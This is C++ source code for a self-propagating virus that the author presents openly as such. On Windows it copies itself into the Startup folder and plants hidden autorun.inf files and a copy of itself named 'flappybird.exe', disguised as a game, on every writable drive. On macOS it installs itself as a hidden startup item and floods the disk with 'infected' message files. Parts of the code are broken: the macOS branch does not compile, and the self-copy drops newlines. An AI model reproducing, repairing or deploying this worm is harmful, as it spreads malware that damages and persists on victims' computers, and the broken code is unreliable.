#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>

using namespace std;

char msg1[] = "You know what, This lovely script below shows why Apple > Windows";

const char *drives[] = {"a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
                        "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
                        "y:", "z:", 0};

int Windows = 0;
int MacOSX  = 0;

string line  = "";
string file  = "";
string hline = "";

string hitline = "";


string autorunData = "[autorun]\nopen=flappybird.exe\naction=Click here to open this USB drive\nshell\\open\\command=flappybird.exe";


int main(int argc, char** argv) {
	
	/* 
	Right then...
	
	Let's see what I come up with
	*/
	
	#ifdef _WIN32
		ofstream testForWindows ("c:\\test.txt");	// <- This being so I can check for windows...
		if (testForWindows.is_open())
		{
			Windows = 1;
			testForWindows.close();
			system("del c:\\test.txt");
		}
	#endif
	#ifdef __APPLE__
		ofstream testForOSX ("test.txt");		// <- And this for Mac OSX
		if (testForOSX.is_open())
		{
			MacOSX = 1;
			testForOSX.close();
			system("rm test.txt");
		} else {
			// I really can't be bothered to add anymore Operating Systems to this
			bool CantBeBothered = true;
		}
	#endif
	
	
	/*
	Well, We got that out of the way
	Time for the persistence section!
	
	I won't be adding a very sophisticated persistence system as it won't be needed
	At best, these files will just be hidden.
	*/
	
	if (Windows == 1) 
	{
		/* 
		We now know what a path file for a drive will be,
		so this way this thing will be able to piggyback on one
		*/
		
		system(("copy " + string(argv[0]) + " c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\").c_str());
		
		ifstream thisFile (argv[0], ios::binary);	// <- My Current File
		
		if (thisFile.is_open())	
		{
			while (getline(thisFile, line))	// <- Get Line
			{
				file = file + line;			// <- Add it into my file data varible
			}
			
			thisFile.close();
		}
		
		for (int x = 0; x < 26; x++)
		{
			fstream drive (string(drives[x]) + "\\hit.txt");	// <- Create hit.txt both signalling that this drive has been 'hit' and also using it get a hold on any existing drives
			
			if (drive.is_open()) 
			{
				while (getline(drive, hline))			// <- Checking whether drive has been hit
				{
					hitline = hitline + hline;
				}
				
				if (hitline == "") {
					ofstream autorun (string(drives[x]) + "\\autorun.inf");		// <- Create my autorun script
					autorun << autorunData;								// <- Add file data
					autorun.close();									// <- Close file
					
					drive << "jhjLJFHALJDSasdjL023K23HFLJASHDFLJHAL";	// <- insert some random garbage into the hit file
					drive.close();
					
					fstream targetFile (string(drives[x]) + "\\flappybird.exe", ios::binary);	// <- Opening a copy of myself to piggyback on the drive
					
					targetFile << file;
					
					targetFile.close();
					
					system(("attrib +h " + string(drives[x]) + "\\autorun.inf").c_str());
					system(("attrib +h " + string(drives[x]) + "\\hit.txt").c_str());
					system(("attrib +h " + string(drives[x]) + "\\flappybird.exe").c_str());
					
				} else {
					bool IgnoringThis = true;							// <- Virus has done its job already, we gonna ignore it
				}
			}
		}
		
	} else if (MacOSX == 1) {
		
		/* 
		I'm not going to even try and implement a persistance system on OSX other than startup and hidding the file
		too hard...
		*/
		
		system(("cp " + argv[0] + "/System/Library/StartupItems").c_str());
		system(("chflags hidden " + argv[0]).c_str());
		system(("chflags hidden /System/Library/StartupItems/" + argv[0]).c_str());
		
		for (int x; x < 100000; x++) {
			ofstream targetFile (("HelloThere" + x + ".txt").c_Str());		// <- A file with a little message

			if (targetFile.is_open()) 		
			{
				targetFile << "Hello!\n" << "It seems that your computer has been infected by a virus\n";
			}
		}
		
	}
	
	return 0;
}
